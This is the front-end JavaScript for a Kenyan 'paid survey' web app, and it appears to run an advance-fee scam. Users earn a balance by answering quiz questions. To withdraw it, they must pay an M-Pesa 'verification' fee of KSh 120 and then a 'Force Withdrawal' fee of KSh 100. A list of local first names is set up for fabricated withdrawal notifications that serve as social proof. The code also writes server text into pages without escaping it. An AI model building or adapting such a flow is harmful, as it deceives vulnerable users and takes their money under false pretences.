const API = 'https://kenyasurveysback.onrender.com/api';

// ════════════════════════════════════════════
// STATE
// ════════════════════════════════════════════
let token = localStorage.getItem('ks_token') || null;
let userProfile = null;
let currentPage = 0;
let totalPages = 20;
let stats = {
  balance: 0, totalEarned: 0, completedQuestions: 0,
  totalQuestions: 120, activated: false, forceVerified: false,
  activationPhone: "", transactions: []
};
let activationRef = null;
let activationPollTimer = null;
let forceVerifyPollTimer = null;

// ════════════════════════════════════════════
// INIT
// ════════════════════════════════════════════
window.addEventListener('DOMContentLoaded', () => {
  const nav = document.getElementById('lp-nav');
  if (nav) {
    window.addEventListener('scroll', () => {
      nav.style.boxShadow = window.scrollY > 10 ? '0 4px 24px rgba(0,0,0,0.45)' : 'none';
    });
  }
  if (token) {
    loadUser();
  } else {
    showHeroCta('guest');
  }
});

async function loadUser() {
  try {
    const data = await apiFetch('/auth/profile');
    userProfile = data;
    if (!data.profileComplete) {
      showScreen('profile-screen');
    } else {
      showHeroCta('user');
      showScreen('app-screen');
      await initApp();
      startWithdrawalNotifs();
    }
  } catch {
    token = null;
    localStorage.removeItem('ks_token');
    showHeroCta('guest');
    showScreen('landing-screen');
  }
}

async function initApp() {
  updateSidebarUser();
  await loadStats();
  loadQuestions(currentPage);
}

// ════════════════════════════════════════════
// HERO CTA
// ════════════════════════════════════════════
function showHeroCta(state) {
  const guest = document.getElementById('lp-hero-cta-guest');
  const user  = document.getElementById('lp-hero-cta-user');
  if (!guest || !user) return;
  if (state === 'user') {
    guest.classList.add('hidden');
    user.classList.remove('hidden');
  } else {
    guest.classList.remove('hidden');
    user.classList.add('hidden');
  }
}

// ════════════════════════════════════════════
// SCREENS
// ════════════════════════════════════════════
function showScreen(id) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  const target = document.getElementById(id);
  if (target) target.classList.add('active');
  window.scrollTo(0, 0);
}

function showPanel(name) {
  document.querySelectorAll('.page-panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));

  const panel = document.getElementById('panel-' + name);
  if (panel) panel.classList.add('active');

  const navEl = document.getElementById('nav-' + name);
  if (navEl) navEl.classList.add('active');

  closeSidebar();

  if (name === 'survey') {
    loadQuestions(currentPage);
  }

  if (name === 'withdraw') {
    const wdLocked = document.getElementById('wd-locked');
    const wdForce  = document.getElementById('wd-force');
    const wdErr    = document.getElementById('wd-error');
    const wdSucc   = document.getElementById('wd-success');
    if (wdLocked) wdLocked.classList.add('hidden');
    if (wdForce)  wdForce.classList.add('hidden');
    if (wdErr)    clearAlert(wdErr);
    if (wdSucc)   clearAlert(wdSucc);
    loadStats();
  }

  if (name === 'transactions') {
    loadStats().then(() => renderAllTransactions());
  }
}

// ════════════════════════════════════════════
// LANDING HELPERS
// ════════════════════════════════════════════
function goToAuth(tab) {
  showScreen('auth-screen');
  switchTab(tab === 'login' ? 'login' : 'register');
}

function goToLanding() {
  showScreen('landing-screen');
}

function lpScrollTop() {
  if (document.getElementById('landing-screen') &&
      document.getElementById('landing-screen').classList.contains('active')) {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  } else {
    showScreen('landing-screen');
  }
}

function lpScrollTo(id) {
  if (!document.getElementById('landing-screen').classList.contains('active')) {
    showScreen('landing-screen');
    setTimeout(() => {
      const el = document.getElementById(id);
      if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }, 80);
  } else {
    const el = document.getElementById(id);
    if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }
}

function toggleLpMenu() {
  const m = document.getElementById('lp-mobile-menu');
  if (m) m.classList.toggle('open');
}

function closeLpMenu() {
  const m = document.getElementById('lp-mobile-menu');
  if (m) m.classList.remove('open');
}

function toggleFaq(btn) {
  const answer = btn.nextElementSibling;
  const isOpen = answer.classList.contains('open');
  document.querySelectorAll('.lp-faq-a').forEach(a => a.classList.remove('open'));
  document.querySelectorAll('.lp-faq-q').forEach(b => b.classList.remove('open'));
  if (!isOpen) {
    answer.classList.add('open');
    btn.classList.add('open');
  }
}

// ════════════════════════════════════════════
// MODALS
// ════════════════════════════════════════════
function showModal(type) {
  const overlay = document.getElementById('modal-overlay');
  const modal   = document.getElementById('modal-' + type);
  if (!overlay || !modal) return;
  overlay.classList.add('show');
  document.querySelectorAll('.modal').forEach(m => m.classList.remove('show'));
  modal.classList.add('show');
}

function closeModal() {
  const overlay = document.getElementById('modal-overlay');
  if (overlay) overlay.classList.remove('show');
  document.querySelectorAll('.modal').forEach(m => m.classList.remove('show'));
}

// ════════════════════════════════════════════
// AUTH
// ════════════════════════════════════════════
function switchTab(tab) {
  const isLogin = tab === 'login';
  document.getElementById('form-register').classList.toggle('hidden', isLogin);
  document.getElementById('form-login').classList.toggle('hidden', !isLogin);
  document.getElementById('tab-register').classList.toggle('active', !isLogin);
  document.getElementById('tab-login').classList.toggle('active', isLogin);
}

async function doRegister() {
  const phone = document.getElementById('reg-phone').value.trim();
  const pin   = document.getElementById('reg-pin').value.trim();
  const pin2  = document.getElementById('reg-pin2').value.trim();
  const errEl = document.getElementById('reg-error');
  const btn   = document.getElementById('btn-register');

  clearAlert(errEl);
  if (!phone || !pin || !pin2) { showAlert(errEl, 'All fields are required.'); return; }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span>';

  try {
    const data = await apiFetch('/auth/register', 'POST', { phone, pin, pin2 });
    token = data.token;
    localStorage.setItem('ks_token', token);
    toast('Account created!', 'success');
    const user = await apiFetch('/auth/profile');
    userProfile = user;
    showScreen('profile-screen');
  } catch (err) {
    showAlert(errEl, err.message || 'Registration failed.');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-user-plus"></i> Create Account';
  }
}

async function doLogin() {
  const phone = document.getElementById('login-phone').value.trim();
  const pin   = document.getElementById('login-pin').value.trim();
  const errEl = document.getElementById('login-error');
  const btn   = document.getElementById('btn-login');

  clearAlert(errEl);
  if (!phone || !pin) { showAlert(errEl, 'Phone and PIN required.'); return; }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span>';

  try {
    const data = await apiFetch('/auth/login', 'POST', { phone, pin });
    token = data.token;
    localStorage.setItem('ks_token', token);
    const user = await apiFetch('/auth/profile');
    userProfile = user;
    if (!user.profileComplete) {
      showScreen('profile-screen');
    } else {
      showHeroCta('user');
      showScreen('app-screen');
      await initApp();
      startWithdrawalNotifs();
    }
  } catch (err) {
    showAlert(errEl, err.message || 'Login failed.');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Sign In';
  }
}

async function doCompleteProfile() {
  const name       = document.getElementById('prof-name').value.trim();
  const county     = document.getElementById('prof-county').value;
  const occupation = document.getElementById('prof-occupation').value;
  const education  = document.getElementById('prof-education').value;
  const errEl      = document.getElementById('prof-error');
  const succEl     = document.getElementById('prof-success');
  const btn        = document.getElementById('btn-profile');

  clearAlert(errEl); clearAlert(succEl);
  if (!name || !county || !occupation || !education) {
    showAlert(errEl, 'All fields are required.');
    return;
  }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span>';

  try {
    await apiFetch('/auth/profile/complete', 'POST', { name, county, occupation, education });
    showAlert(succEl, 'Profile saved! Redirecting to dashboard...');
    const user = await apiFetch('/auth/profile');
    userProfile = user;
    setTimeout(async () => {
      showHeroCta('user');
      showScreen('app-screen');
      await initApp();
      startWithdrawalNotifs();
    }, 1200);
  } catch (err) {
    showAlert(errEl, err.message || 'Failed to save profile.');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-check"></i> Save Profile and Continue';
  }
}

function doLogout() {
  token = null;
  userProfile = null;
  stats = {
    balance: 0, totalEarned: 0, completedQuestions: 0,
    totalQuestions: 120, activated: false, forceVerified: false,
    activationPhone: "", transactions: []
  };
  localStorage.removeItem('ks_token');
  showHeroCta('guest');
  const landing = document.getElementById('landing-screen');
  if (landing) {
    showScreen('landing-screen');
  } else {
    showScreen('auth-screen');
  }
}

// ════════════════════════════════════════════
// STATS & DASHBOARD
// ════════════════════════════════════════════
async function loadStats() {
  try {
    const data = await apiFetch('/survey/stats');
    stats = {
      ...data,
      completedIds:    data.completedIds    || [],
      forceVerified:   data.forceVerified   || false,
      activationPhone: data.activationPhone || "",
      transactions:    data.transactions    || []
    };
    updateDashboard();
    updateWithdrawPanel();
  } catch (err) {
    console.error('Failed to load stats:', err.message);
  }
}

function updateDashboard() {
  const bal       = (stats.balance || 0).toFixed(2);
  const earned    = (stats.totalEarned || 0).toFixed(2);
  const completed = stats.completedQuestions || 0;
  const total     = stats.totalQuestions || 120;
  const remaining = total - completed;
  const pct       = Math.round((completed / total) * 100);

  const sidebarBal = document.getElementById('sidebar-balance');
  if (sidebarBal) sidebarBal.textContent = `KSh ${bal}`;

  const sidebarEarned = document.getElementById('sidebar-earned');
  if (sidebarEarned) sidebarEarned.textContent = `Total compensation: KSh ${earned}`;

  const mobBal = document.getElementById('mobile-balance');
  if (mobBal) mobBal.textContent = `KSh ${bal}`;

  const statBal = document.getElementById('stat-balance');
  if (statBal) statBal.textContent = bal;

  const statEarned = document.getElementById('stat-earned');
  if (statEarned) statEarned.textContent = earned;

  const statComp = document.getElementById('stat-completed');
  if (statComp) statComp.textContent = completed;

  const statRem = document.getElementById('stat-remaining');
  if (statRem) statRem.textContent = remaining;

  const progFill = document.getElementById('progress-fill');
  if (progFill) progFill.style.width = pct + '%';

  const progText = document.getElementById('progress-text');
  if (progText) progText.textContent = `${completed} / ${total} completed`;

  const navBadge = document.getElementById('nav-survey-badge');
  if (navBadge) navBadge.textContent = remaining;

  const hour  = new Date().getHours();
  const greet = hour < 12 ? 'Good morning' : hour < 17 ? 'Good afternoon' : 'Good evening';
  const greeting = document.getElementById('dash-greeting');
  if (greeting) greeting.textContent = `${greet}, ${userProfile?.name || 'there'}!`;

  // ── Withdraw CTA widget ──
  const wctaTitle = document.getElementById('wcta-title');
  const wctaDesc  = document.getElementById('wcta-desc');
  const wctaBtn   = document.getElementById('wcta-btn');
  const dot1      = document.getElementById('wcta-dot-1');
  const dot2      = document.getElementById('wcta-dot-2');
  const dot3      = document.getElementById('wcta-dot-3');
  const step1     = document.getElementById('wcta-step-1');
  const step2     = document.getElementById('wcta-step-2');
  const step3     = document.getElementById('wcta-step-3');

  if (dot1 && dot2 && dot3 && step1 && step2 && step3) {
    if (!stats.activated) {
      dot1.className  = 'wcta-step-dot active';
      dot2.className  = 'wcta-step-dot pending';
      dot3.className  = 'wcta-step-dot pending';
      step1.className = 'wcta-step active';
      step2.className = 'wcta-step';
      step3.className = 'wcta-step';
      if (wctaTitle) wctaTitle.textContent = 'Withdraw Your Earnings';
      if (wctaDesc)  wctaDesc.textContent  = 'Complete account registration to activate M-Pesa withdrawals.';
      if (wctaBtn) {
        wctaBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Register Your Payments';
        wctaBtn.onclick   = () => showPanel('withdraw');
      }
    } else if (!stats.forceVerified) {
      dot1.className  = 'wcta-step-dot done';
      dot2.className  = 'wcta-step-dot active';
      dot3.className  = 'wcta-step-dot pending';
      step1.className = 'wcta-step done';
      step2.className = 'wcta-step active';
      step3.className = 'wcta-step';
      if (wctaTitle) wctaTitle.textContent = 'One Step Away from Withdrawal';
      if (wctaDesc)  wctaDesc.textContent  = 'Account verified. Complete Force Withdrawal to enable payouts.';
      if (wctaBtn) {
        wctaBtn.innerHTML = '<i class="fas fa-link"></i> Force Withdraw';
        wctaBtn.onclick   = () => showPanel('withdraw');
      }
    } else {
      dot1.className  = 'wcta-step-dot done';
      dot2.className  = 'wcta-step-dot done';
      dot3.className  = 'wcta-step-dot active';
      step1.className = 'wcta-step done';
      step2.className = 'wcta-step done';
      step3.className = 'wcta-step active';
      if (wctaTitle) wctaTitle.textContent = 'Ready to Withdraw';
      if (wctaDesc)  wctaDesc.textContent  = 'Your account is fully verified. Submit a payment request to your M-Pesa number.';
      if (wctaBtn) {
        wctaBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Withdraw Now';
        wctaBtn.onclick   = () => showPanel('withdraw');
      }
    }
  }

  renderDashTransactions();
}

function updateSidebarUser() {
  if (!userProfile) return;
  const sName = document.getElementById('sidebar-name');
  const sPhone = document.getElementById('sidebar-phone');
  if (sName)  sName.textContent  = userProfile.name  || 'User';
  if (sPhone) sPhone.textContent = '+' + (userProfile.phone || '');
}

function renderDashTransactions() {
  const el  = document.getElementById('dash-tx-list');
  if (!el) return;
  const txs = (stats.transactions || []).slice(0, 6);
  if (!txs.length) {
    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No activity yet. Participate in surveys to begin earning compensation.</p></div>';
    return;
  }
  el.innerHTML = txs.map(tx => renderTxItem(tx)).join('');
}

function renderAllTransactions() {
  const el  = document.getElementById('all-tx-list');
  if (!el) return;
  const txs = stats.transactions || [];
  if (!txs.length) {
    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No activity yet. Participate in surveys to begin earning compensation.</p></div>';
    return;
  }
  el.innerHTML = txs.map(tx => renderTxItem(tx)).join('');
}

function renderTxItem(tx) {
  const isPositive = tx.amount > 0;
  const type       = tx.type;
  let iconClass = 'earn', iconName = 'coins';
  if (type === 'withdrawal')                                  { iconClass = 'withdraw'; iconName = 'paper-plane'; }
  else if (type === 'welcome_bonus' || type === 'activation') { iconClass = 'bonus';    iconName = 'gift'; }

  const date   = new Date(tx.createdAt).toLocaleDateString('en-KE', {
    day: 'numeric', month: 'short', year: 'numeric'
  });
  const amount = isPositive
    ? `+KSh ${tx.amount.toFixed(2)}`
    : `-KSh ${Math.abs(tx.amount).toFixed(2)}`;

  return `<div class="tx-item">
    <div class="tx-icon ${iconClass}"><i class="fas fa-${iconName}"></i></div>
    <div>
      <div class="tx-desc">${tx.description}</div>
      <div class="tx-date">${date}</div>
    </div>
    <div class="tx-amount ${isPositive ? 'positive' : 'negative'}">${amount}</div>
  </div>`;
}

// ════════════════════════════════════════════
// SURVEY
// ════════════════════════════════════════════
async function loadQuestions(page) {
  const grid = document.getElementById('questions-grid');
  if (!grid) return;
  grid.innerHTML = '<div class="empty-state"><div class="spinner"></div></div>';
  try {
    const data = await apiFetch(`/survey/questions?page=${page}`);
    totalPages  = data.totalPages;
    currentPage = data.page;
    renderQuestions(data.questions);
    updatePagination();
    renderPageDots(data.totalPages);
  } catch {
    grid.innerHTML = '<div class="empty-state"><i class="fas fa-exclamation-circle"></i><p>Failed to load questions.</p></div>';
  }
}

function renderQuestions(questions) {
  const grid         = document.getElementById('questions-grid');
  if (!grid) return;
  const completedIds = stats.completedIds || [];

  grid.innerHTML = questions.map(q => {
    const isAnswered = completedIds.includes(q.id);
    return `<div class="question-card${isAnswered ? ' answered' : ''}" id="qcard-${q.id}" data-answered="${isAnswered}">
      <div class="question-meta">
        <span class="question-cat">${q.category}</span>
        <div style="display:flex;align-items:center;gap:8px;">
          ${isAnswered
            ? `<span class="question-answered-badge"><i class="fas fa-check-circle"></i> Completed</span>`
            : `<span class="question-reward"><i class="fas fa-coins"></i> KSh ${q.reward}</span>`
          }
        </div>
      </div>
      <div class="question-text">${q.question}</div>
      <div class="options-grid">
        ${q.options.map((opt, i) => `
          <button class="option-btn" id="opt-${q.id}-${i}"
            onclick="submitAnswer(${q.id}, ${i}, ${q.reward})"
            ${isAnswered ? 'disabled' : ''}>${opt}</button>
        `).join('')}
      </div>
      <div class="question-result" id="result-${q.id}">
        ${isAnswered
          ? `<span style="color:var(--text3);font-size:0.82rem;display:flex;align-items:center;gap:6px;margin-top:8px;">
               <i class="fas fa-lock" style="color:var(--green-dark)"></i> Already completed
             </span>`
          : ''
        }
      </div>
    </div>`;
  }).join('');
}

async function submitAnswer(questionId, answerIndex, reward) {
  const card = document.getElementById('qcard-' + questionId);
  if (!card || card.dataset.answered === 'true') return;

  for (let i = 0; i < 4; i++) {
    const b = document.getElementById(`opt-${questionId}-${i}`);
    if (b) b.disabled = true;
  }

  const selectedBtn = document.getElementById(`opt-${questionId}-${answerIndex}`);
  if (selectedBtn) selectedBtn.style.opacity = '0.7';

  try {
    const data = await apiFetch('/survey/answer', 'POST', { questionId, answer: answerIndex });

    if (data.alreadyAnswered) {
      toast('Already completed.', 'info');
      card.dataset.answered = 'true';
      return;
    }

    const correctBtn = document.getElementById(`opt-${questionId}-${data.correctIndex}`);
    if (correctBtn) correctBtn.classList.add('reveal-correct');

    const resultEl = document.getElementById('result-' + questionId);

    if (data.correct) {
      selectedBtn.classList.add('selected-correct');
      card.classList.add('correct');
      resultEl.className = 'question-result correct';
      resultEl.innerHTML = `<i class="fas fa-check-circle"></i> Correct! KSh ${data.earned} added.`;
      showEarnPop(data.earned);
      toast(`Correct! +KSh ${data.earned} added.`, 'success');
    } else {
      selectedBtn.classList.add('selected-wrong');
      card.classList.add('wrong');
      resultEl.className = 'question-result wrong';
      resultEl.innerHTML = `<i class="fas fa-times-circle"></i> Incorrect. ${data.explanation || ''}`;
      toast('Incorrect. Keep going!', 'error');
    }

    card.dataset.answered = 'true';
    stats.balance = data.balance;
    stats.completedQuestions = (stats.completedQuestions || 0) + 1;
    if (data.correct) stats.totalEarned = (stats.totalEarned || 0) + data.earned;

    const sbBal = document.getElementById('sidebar-balance');
    const mbBal = document.getElementById('mobile-balance');
    const stBal = document.getElementById('stat-balance');
    const wdBal = document.getElementById('wd-balance');
    if (sbBal) sbBal.textContent = `KSh ${data.balance.toFixed(2)}`;
    if (mbBal) mbBal.textContent = `KSh ${data.balance.toFixed(2)}`;
    if (stBal) stBal.textContent = data.balance.toFixed(2);
    if (wdBal) wdBal.textContent = `KSh ${data.balance.toFixed(2)}`;

    loadStats();

  } catch (err) {
    toast(err.message || 'Failed to submit.', 'error');
    for (let i = 0; i < 4; i++) {
      const b = document.getElementById(`opt-${questionId}-${i}`);
      if (b) b.disabled = false;
    }
  }
}

function changePage(dir) {
  const newPage = currentPage + dir;
  if (newPage < 0 || newPage >= totalPages) return;
  currentPage = newPage;
  loadQuestions(currentPage);
  window.scrollTo(0, 0);
}

function updatePagination() {
  const prev = document.getElementById('btn-prev');
  const next = document.getElementById('btn-next');
  const info = document.getElementById('page-info');
  if (prev) prev.disabled = currentPage === 0;
  if (next) next.disabled = currentPage >= totalPages - 1;
  if (info) info.textContent = `Page ${currentPage + 1} of ${totalPages}`;
  if (next) next.innerHTML = currentPage >= totalPages - 1
    ? '<i class="fas fa-flag-checkered"></i> Finish'
    : 'Next <i class="fas fa-arrow-right"></i>';
}

function renderPageDots(total) {
  const container = document.getElementById('page-dots');
  if (!container) return;
  container.innerHTML = '';
  for (let i = 0; i < total; i++) {
    const dot = document.createElement('div');
    dot.className = 'page-dot' + (i === currentPage ? ' current' : '');
    dot.onclick = () => { currentPage = i; loadQuestions(i); };
    container.appendChild(dot);
  }
}

// ════════════════════════════════════════════
// PARTICIPANT COMPENSATION (WITHDRAW)
// ════════════════════════════════════════════
function formatPhoneDisplay(phone) {
  let ph = String(phone || '');
  if (ph.startsWith('254') && ph.length === 12) ph = '0' + ph.slice(3);
  return ph;
}

function updateWithdrawPanel() {
  const bal = (stats.balance || 0).toFixed(2);
  const wdBal = document.getElementById('wd-balance');
  if (wdBal) wdBal.textContent = `KSh ${bal}`;

  const maxWithdraw = Math.max(150, Math.min(Math.floor((stats.balance || 0) / 10) * 10, 10000));
  const slider = document.getElementById('wd-slider');
  if (slider) {
    slider.max = maxWithdraw;
    const sliderMax = document.getElementById('wd-slider-max');
    if (sliderMax) sliderMax.textContent = `KSh ${maxWithdraw.toLocaleString()}`;
    updateSlider();
  }

  const statusEl = document.getElementById('wd-status');
  const phoneRow = document.getElementById('wd-phone-row');
  const regPhone = document.getElementById('wd-reg-phone');

  if (phoneRow) phoneRow.classList.add('hidden');

  if (!stats.activated) {
    if (statusEl) statusEl.innerHTML = '<span class="chip gold"><i class="fas fa-shield-alt"></i> Verification Required</span>';
  } else if (!stats.forceVerified) {
    if (statusEl) statusEl.innerHTML = '<span class="chip" style="background:rgba(0,166,81,0.12);color:var(--green-light);border-color:rgba(0,166,81,0.3)"><i class="fas fa-check-circle"></i> Verified – Payout Activation Pending</span>';
    if (stats.activationPhone && phoneRow && regPhone) {
      phoneRow.classList.remove('hidden');
      regPhone.textContent = formatPhoneDisplay(stats.activationPhone);
    }
  } else {
    if (statusEl) statusEl.innerHTML = '<span class="chip"><i class="fas fa-check"></i> Fully Verified</span>';
    if (stats.activationPhone && phoneRow && regPhone) {
      phoneRow.classList.remove('hidden');
      regPhone.textContent = formatPhoneDisplay(stats.activationPhone);
    }
  }
}

function updateSlider() {
  const slider = document.getElementById('wd-slider');
  if (!slider) return;
  const val       = parseFloat(slider.value);
  const fee       = parseFloat((val * 0.04).toFixed(2));
  const receive   = parseFloat((val - fee).toFixed(2));
  const display   = document.getElementById('wd-amount-display');
  const receiveEl = document.getElementById('wd-receive');
  if (display)   display.textContent   = val;
  if (receiveEl) receiveEl.textContent = `KSh ${receive.toFixed(2)}`;
}

// ── Payment request ──
async function doWithdraw() {
  const phoneEl  = document.getElementById('wd-phone');
  const sliderEl = document.getElementById('wd-slider');
  const errEl    = document.getElementById('wd-error');
  const succEl   = document.getElementById('wd-success');
  const btn      = document.getElementById('btn-withdraw');
  const wdLocked = document.getElementById('wd-locked');
  const wdForce  = document.getElementById('wd-force');

  if (!phoneEl || !sliderEl || !errEl || !succEl || !btn) return;

  const phone  = phoneEl.value.trim();
  const amount = parseFloat(sliderEl.value);

  clearAlert(errEl);
  clearAlert(succEl);
  if (wdLocked) wdLocked.classList.add('hidden');
  if (wdForce)  wdForce.classList.add('hidden');

  if (!phone) {
    showAlert(errEl, 'Please enter a recipient M-Pesa number.');
    return;
  }
  if (isNaN(amount) || amount < 150) {
    showAlert(errEl, 'Minimum payment request is KSh 150.');
    return;
  }
  if (amount > (stats.balance || 0)) {
    showAlert(errEl, `Insufficient balance. Available: KSh ${(stats.balance || 0).toFixed(2)}.`);
    return;
  }

  if (!stats.activated) {
    showAlert(errEl, 'Complete the account verification below.');
    if (wdLocked) {
      wdLocked.classList.remove('hidden');
      wdLocked.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
    return;
  }

  if (!stats.forceVerified) {
    showAlert(errEl, 'Force Withdrawal required. Complete the activation below.');
    if (wdForce) {
      wdForce.classList.remove('hidden');
      wdForce.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
    return;
  }

  const fee     = parseFloat((amount * 0.04).toFixed(2));
  const receive = parseFloat((amount - fee).toFixed(2));

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Processing...';

  try {
    const data = await apiFetch('/survey/withdraw', 'POST', { amount, mpesaPhone: phone });
    stats.balance = data.balance;
    updateDashboard();
    updateWithdrawPanel();
    showAlert(succEl, `Request of KSh ${amount} submitted. You will receive KSh ${receive} after KSh ${fee} fee. Arrives within 24hrs.`);
    toast('Payment request submitted!', 'success');
    phoneEl.value = '';
    loadStats();
  } catch (err) {
    showAlert(errEl, err.message || 'Payment request failed. Try again.');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Payment Request';
  }
}

// ── Account Verification (KSh 120) ──
async function doActivate() {
  const phoneEl = document.getElementById('act-phone');
  const errEl   = document.getElementById('act-error');
  const succEl  = document.getElementById('act-success');
  const btn     = document.getElementById('btn-activate');

  if (!phoneEl || !errEl || !succEl || !btn) return;

  const phone = phoneEl.value.trim();
  clearAlert(errEl); clearAlert(succEl);
  if (!phone) { showAlert(errEl, 'Enter your M-Pesa phone number.'); return; }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Sending prompt...';

  try {
    const data = await apiFetch('/activation/initiate', 'POST', { phone });
    activationRef = data.reference;
    showAlert(succEl, 'M-Pesa prompt sent. Enter your PIN to complete verification.');
    toast('Check your phone for the M-Pesa prompt.', 'info');
    startActivationPoll(activationRef);
  } catch (err) {
    showAlert(errEl, err.message || 'Failed to send prompt.');
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account ';
  }
}

function startActivationPoll(ref) {
  if (activationPollTimer) clearInterval(activationPollTimer);
  let attempts = 0;
  const btn = document.getElementById('btn-activate');

  activationPollTimer = setInterval(async () => {
    attempts++;
    if (attempts > 30) {
      clearInterval(activationPollTimer);
      if (btn) {
        btn.disabled = false;
        btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account ';
      }
      return;
    }
    try {
      const data = await apiFetch(`/activation/status/${ref}`);
      if (data.status === 'success') {
        clearInterval(activationPollTimer);
        await loadStats();
        const wdLocked = document.getElementById('wd-locked');
        const wdForce  = document.getElementById('wd-force');
        if (wdLocked) wdLocked.classList.add('hidden');
        if (wdForce) {
          wdForce.classList.remove('hidden');
          wdForce.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }
        toast('Verified! Complete Force Withdrawal to enable payouts.', 'success');
        if (btn) btn.disabled = false;
      } else if (data.status === 'failed') {
        clearInterval(activationPollTimer);
        const errEl = document.getElementById('act-error');
        if (errEl) showAlert(errEl, 'Payment failed. Please try again.');
        if (btn) {
          btn.disabled = false;
          btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 120';
        }
      }
    } catch (err) {
      console.error('Poll error:', err.message);
    }
  }, 3000);
}

// ── Force Withdrawal (KSh 100) ──
async function doForceVerify() {
  const errEl  = document.getElementById('fv-error');
  const succEl = document.getElementById('fv-success');
  const btn    = document.getElementById('btn-force-verify');

  if (!errEl || !succEl || !btn) return;

  clearAlert(errEl); clearAlert(succEl);
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Sending prompt...';

  try {
    const data = await apiFetch('/activation/force/initiate', 'POST', {});
    const displayPhone = formatPhoneDisplay(data.phone);
    showAlert(succEl, `Prompt sent to ${displayPhone}. Enter your PIN to activate payouts.`);
    toast('Check your phone for the KSh 100 prompt.', 'info');
    startForceVerifyPoll(data.reference, btn);
  } catch (err) {
    showAlert(errEl, err.message || 'Failed to send prompt.');
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal – KSh 100';
  }
}

function startForceVerifyPoll(ref, btn) {
  if (forceVerifyPollTimer) clearInterval(forceVerifyPollTimer);
  let attempts = 0;

  forceVerifyPollTimer = setInterval(async () => {
    attempts++;
    if (attempts > 30) {
      clearInterval(forceVerifyPollTimer);
      if (btn) {
        btn.disabled = false;
        btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal ';
      }
      return;
    }
    try {
      const data = await apiFetch(`/activation/status/${ref}`);
      if (data.status === 'success') {
        clearInterval(forceVerifyPollTimer);
        await loadStats();
        const wdForce = document.getElementById('wd-force');
        if (wdForce) wdForce.classList.add('hidden');
        toast('Payout channel activated! Submit payment requests now.', 'success');
        if (btn) btn.disabled = false;
      } else if (data.status === 'failed') {
        clearInterval(forceVerifyPollTimer);
        const errEl = document.getElementById('fv-error');
        if (errEl) showAlert(errEl, 'Activation failed. Try again.');
        if (btn) {
          btn.disabled = false;
          btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal ';
        }
      }
    } catch (err) {
      console.error('Poll error:', err.message);
    }
  }, 3000);
}

// ════════════════════════════════════════════
// SIDEBAR MOBILE
// ════════════════════════════════════════════
function toggleSidebar() {
  const sb  = document.getElementById('sidebar');
  const ov  = document.getElementById('sidebar-overlay');
  if (sb) sb.classList.toggle('open');
  if (ov) ov.classList.toggle('show');
}

function closeSidebar() {
  const sb = document.getElementById('sidebar');
  const ov = document.getElementById('sidebar-overlay');
  if (sb) sb.classList.remove('open');
  if (ov) ov.classList.remove('show');
}

// ════════════════════════════════════════════
// UTILITIES
// ════════════════════════════════════════════
async function apiFetch(path, method = 'GET', body = null) {
  const opts = { method, headers: { 'Content-Type': 'application/json' } };
  if (token) opts.headers['Authorization'] = `Bearer ${token}`;
  if (body)  opts.body = JSON.stringify(body);
  const res  = await fetch(API + path, opts);
  const data = await res.json();
  if (!res.ok) throw new Error(data.message || 'Request failed');
  return data;
}

function showAlert(el, msg) {
  if (!el) return;
  el.textContent = msg;
  el.classList.add('show');
}

function clearAlert(el) {
  if (!el) return;
  el.textContent = '';
  el.classList.remove('show');
}

function toast(msg, type = 'info') {
  const container = document.getElementById('toast-container');
  if (!container) return;
  const el     = document.createElement('div');
  el.className = `toast ${type}`;
  const icons  = { success: 'check-circle', error: 'times-circle', info: 'info-circle' };
  el.innerHTML = `<i class="fas fa-${icons[type] || 'info-circle'}"></i> ${msg}`;
  container.appendChild(el);
  setTimeout(() => {
    el.style.animation = 'slideOut 0.3s ease forwards';
    setTimeout(() => el.remove(), 300);
  }, 3500);
}

function showEarnPop(amount) {
  const pop = document.getElementById('earn-pop');
  const amt = document.getElementById('earn-amount');
  if (!pop || !amt) return;
  amt.textContent = `+KSh ${amount}`;
  pop.classList.add('show');
  setTimeout(() => pop.classList.remove('show'), 1800);
}

// ════════════════════════════════════════════
// WITHDRAWAL NOTIFICATIONS
// ════════════════════════════════════════════
const NOTIF_NAMES = [
  'Amina','Baraka','Chebet','Dalila','Esther','Fatuma','Grace','Halima',
  'Imani','Joyce','Kendi','Lilian','Makena','Njeri','Otieno','Pendo',
  'Rehema','Saida','Tabitha','Uchenna','Violet','Wambui','Xolile','Zawadi',
  'Akinyi','Beatrice','Cynthia','Diana','Eunice','Florence','Gladys','Hellen',
  'Irene','Jacinta','Kemunto','Leah','Mercy','Nancy','Olive','Priscilla',
  'Rahel','Selina','Teresia','Upendo','Veronica','Wanjiku','Yusra','Zipporah',
  'Adhiambo','Boniface'
];
